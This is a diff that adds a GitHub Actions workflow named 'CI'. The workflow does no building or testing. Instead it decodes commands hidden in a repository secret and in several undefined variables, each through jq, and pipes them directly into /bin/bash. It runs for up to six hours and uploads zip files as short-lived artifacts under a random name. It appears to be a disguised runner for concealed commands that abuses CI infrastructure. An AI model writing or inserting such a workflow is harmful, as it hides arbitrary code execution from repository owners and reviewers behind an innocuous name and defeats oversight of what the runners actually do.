@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          rlit4: ${{ secrets.rlit4 }}
+        run: |
+          printf '%s' "$rlit4" | jq -r .cmbx233 | /bin/bash
+          echo $lo7951 | jq -r .gfqh6 | /bin/bash
+          echo $j1 | jq -r .ujat58214 | /bin/bash
+          echo $av75038 | jq -r .dsbp2 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pjf06ACx
+          path: "*.zip"
+          retention-days: 1
